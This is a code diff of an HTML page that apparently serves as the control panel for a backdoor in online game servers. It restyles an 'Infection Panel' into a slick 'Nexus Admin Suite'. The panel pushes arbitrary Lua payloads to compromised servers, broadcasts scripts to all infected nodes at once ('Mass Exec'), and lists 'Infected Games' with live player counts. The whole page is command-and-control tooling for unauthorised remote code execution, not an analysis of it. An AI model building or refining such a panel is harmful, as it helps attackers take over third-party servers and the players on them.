@@ -1,31 +1,225 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Infection Panel</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nexus  | Admin Suite</title>
     <style>
-        body { background: #111; color: #ff0000; font-family: monospace; text-align: center; }
-        textarea { width: 80%; height: 200px; background: #000; color: #00ff00; border: 1px solid #ff0000; }
-        input { margin: 10px; padding: 5px; }
-        button { padding: 10px 20px; cursor: pointer; background: #ff0000; color: white; border: none; }
+        /* Apple Design Language 2026 */
+        :root {
+            --apple-blue: #0071e3;
+            --apple-green: #30d158;
+            --apple-red: #ff3b30;
+            --glass-bg: rgba(28, 28, 30, 0.75);
+            --border-color: rgba(255, 255, 255, 0.1);
+        }
+
+        body { 
+            margin: 0; 
+            background: #000 url('https://www.apple.com/v/home/bl/images/overview/hero/hero_iphone15pro__de9bc4v8h26u_large.jpg') no-repeat center center fixed;
+            background-size: cover;
+            color: #fff; 
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Helvetica Neue", sans-serif;
+            -webkit-font-smoothing: antialiased;
+            overflow-x: hidden;
+        }
+
+        /* Top Navigation Bar */
+        .app-header {
+            position: fixed; top: 0; left: 0; width: 100%; height: 50px;
+            background: rgba(0,0,0,0.8); backdrop-filter: saturate(180%) blur(20px);
+            border-bottom: 1px solid #333; display: flex; align-items: center;
+            justify-content: space-between; padding: 0 30px; box-sizing: border-box; z-index: 1000;
+        }
+
+        .app-title { font-weight: 600; font-size: 17px; letter-spacing: -0.022em; cursor: default; }
+        .app-title span { color: #86868b; font-weight: 400; }
+
+        .nav-tabs { display: flex; gap: 5px; }
+        .nav-tab {
+            background: none; border: none; color: #f5f5f7; font-size: 13px;
+            font-weight: 400; cursor: pointer; padding: 6px 14px; border-radius: 6px;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        .nav-tab:hover { background: rgba(255,255,255,0.1); }
+        .nav-tab.active { background: rgba(255,255,255,0.2); font-weight: 600; }
+
+        /* Main Glass Container */
+        .apple-container {
+            display: flex; align-items: center; justify-content: center;
+            min-height: 100vh; padding-top: 60px; box-sizing: border-box;
+        }
+
+        .glass-panel {
+            background: var(--glass-bg);
+            backdrop-filter: blur(30px) saturate(150%);
+            -webkit-backdrop-filter: blur(30px) saturate(150%);
+            border-radius: 24px;
+            border: 1px solid var(--border-color);
+            width: 700px; padding: 40px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
+            transition: transform 0.5s ease;
+        }
+
+        /* Typography & Inputs */
+        h1 { font-size: 32px; font-weight: 700; margin-bottom: 8px; letter-spacing: -0.04em; }
+        .subtitle { color: #a1a1a6; font-size: 16px; margin-bottom: 30px; }
+
+        input, textarea {
+            width: 100%; border-radius: 12px; border: 1px solid #424245;
+            background: rgba(0,0,0,0.4); color: #fff; font-family: "SF Mono", monospace;
+            font-size: 14px; padding: 15px; box-sizing: border-box; margin-bottom: 15px;
+            outline: none; transition: border 0.3s;
+        }
+        input:focus, textarea:focus { border-color: var(--apple-blue); }
+        textarea { height: 220px; resize: none; }
+
+        .apple-btn {
+            background: var(--apple-blue); color: #fff; border: none;
+            border-radius: 12px; padding: 14px; font-size: 16px; font-weight: 600;
+            cursor: pointer; transition: all 0.2s; width: 100%;
+        }
+        .apple-btn:hover { opacity: 0.9; transform: translateY(-1px); }
+        .apple-btn:active { transform: translateY(0); }
+
+        /* Tabs Visibility */
+        .tab-content { display: none; animation: fadeIn 0.4s ease; }
+        .tab-content.active { display: block; }
+
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* Game List Styling */
+        .game-list { 
+            background: rgba(0,0,0,0.2); border-radius: 14px; 
+            overflow: hidden; border: 1px solid var(--border-color);
+        }
+        .game-item {
+            padding: 15px 20px; border-bottom: 1px solid var(--border-color);
+            display: flex; justify-content: space-between; align-items: center;
+        }
+        .game-item:last-child { border-bottom: none; }
+        .status-dot {
+            width: 10px; height: 10px; border-radius: 50%;
+            background: var(--apple-green); display: inline-block;
+            margin-right: 10px; box-shadow: 0 0 10px var(--apple-green);
+        }
+        .player-count { font-size: 12px; color: #86868b; font-weight: 600; }
+
     </style>
 </head>
 <body>
-    <h1>REMOTE INFECTION PANEL</h1>
-    <input type="password" id="pass" placeholder="Admin Password"><br>
-    <textarea id="lua" placeholder="print('Infected!')"></textarea><br>
-    <button onclick="send()">PUSH TO SERVERS</button>
+
+    <header class="app-header">
+        <div class="app-title"> Nexus <span>Admin Suite</span></div>
+        <nav class="nav-tabs">
+            <button class="nav-tab active" onclick="showTab('executor')">Executor</button>
+            <button class="nav-tab" onclick="showTab('whitelist')">Whitelist</button>
+            <button class="nav-tab" onclick="showTab('admin-panel')">Mass Exec</button>
+            <button class="nav-tab" onclick="showTab('games')">Infected Games</button>
+        </nav>
+        <div id="clock" style="font-size:12px; color:#86868b">00:00:00</div>
+    </header>
+
+    <div class="apple-container">
+        <div class="glass-panel">
+
+            <div id="executor" class="tab-content active">
+                <h1>Executor</h1>
+                <p class="subtitle">Standard vLua Payload Delivery</p>
+                <input type="password" id="exec_pass" placeholder="Authorization Password">
+                <textarea id="exec_lua" placeholder="-- Enter Lua Script here..."></textarea>
+                <button class="apple-btn" onclick="sendRequest('/push-lua', 'exec_lua', 'exec_pass')">Push Payload</button>
+            </div>
+
+            <div id="whitelist" class="tab-content">
+                <h1>Whitelist</h1>
+                <p class="subtitle">Manage user access for this suite</p>
+                <input type="text" id="wl_user" placeholder="Target UserID or Name">
+                <button class="apple-btn" onclick="alert('Whitelist database logic required in server.js')">Update Whitelist</button>
+            </div>
+
+            <div id="admin-panel" class="tab-content">
+                <h1>Mass Execution</h1>
+                <p class="subtitle">Execute across all synchronized nodes</p>
+                <input type="password" id="mass_pass" placeholder="Authorization Password">
+                <textarea id="mass_lua" placeholder="-- Script for ALL servers..."></textarea>
+                <button class="apple-btn" style="background: var(--apple-red);" onclick="sendRequest('/push-lua', 'mass_lua', 'mass_pass')">Broadcast Script</button>
+            </div>
+
+            <div id="games" class="tab-content">
+                <h1>Infected Systems</h1>
+                <p class="subtitle">Real-time heartbeat monitor</p>
+                <div class="game-list" id="game_list">
+                    <div class="game-item" style="color:#86868b">Scanning for nodes...</div>
+                </div>
+            </div>
+
+        </div>
+    </div>
 
     <script>
-        async function send() {
-            const code = document.getElementById('lua').value;
-            const pass = document.getElementById('pass').value;
-            await fetch('/update', {
+        // Tab Management
+        function showTab(id) {
+            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.nav-tab').forEach(b => b.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+            event.currentTarget.classList.add('active');
+        }
+
+        // Clock Update
+        function updateClock() {
+            const now = new Date();
+            document.getElementById('clock').innerText = now.toLocaleTimeString();
+        }
+        setInterval(updateClock, 1000);
+
+        // Core Communication
+        async function sendRequest(route, luaId, passId) {
+            const code = document.getElementById(luaId).value;
+            const pass = document.getElementById(passId).value;
+
+            const response = await fetch(route, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ code: code, password: pass })
+                body: JSON.stringify({ lua: code, password: pass })
             });
-            alert("Sent to Render!");
+
+            if (response.ok) {
+                alert("✓ Signal Sent Successfully");
+            } else {
+                alert("✕ Error: Unauthorized or Server Offline");
+            }
         }
+
+        // Games Monitor (Pulls from /get-games)
+        async function fetchGames() {
+            try {
+                const res = await fetch('/get-games');
+                const games = await res.json();
+                const container = document.getElementById('game_list');
+                const gameIds = Object.keys(games);
+
+                if (gameIds.length === 0) {
+                    container.innerHTML = '<div class="game-item" style="color:#86868b">No active infections detected.</div>';
+                    return;
+                }
+
+                container.innerHTML = '';
+                gameIds.forEach(id => {
+                    const game = games[id];
+                    const div = document.createElement('div');
+                    div.className = 'game-item';
+                    div.innerHTML = `
+                        <div><span class="status-dot"></span>${game.name}</div>
+                        <div class="player-count">${game.players} USERS</div>
+                    `;
+                    container.appendChild(div);
+                });
+            } catch (e) { console.error("Heartbeat sync failed."); }
+        }
+
+        setInterval(fetchGames, 5000); // Update list every 5s
+        fetchGames();
     </script>
 </body>
 </html>
